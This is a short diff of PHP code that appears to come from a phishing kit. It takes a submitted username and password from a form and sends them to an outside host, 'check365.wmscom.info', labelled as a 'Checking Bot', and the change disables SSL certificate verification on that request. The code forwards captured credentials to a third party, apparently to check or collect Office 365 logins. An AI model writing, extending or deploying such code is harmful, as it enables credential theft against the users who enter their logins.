@@ -23,6 +23,8 @@ if (!empty($_POST['user']) && !empty($_POST['pass'])) {
     $pass = $_POST['pass'];
     curl_setopt_array($curlz, array(
         CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_SSL_VERIFYHOST => 0,
+	    CURLOPT_SSL_VERIFYPEER => 0,
         CURLOPT_URL => 'http://check365.wmscom.info/true/365.php',
         CURLOPT_USERAGENT => 'NE - Checking Bot',
         CURLOPT_POST => 1,
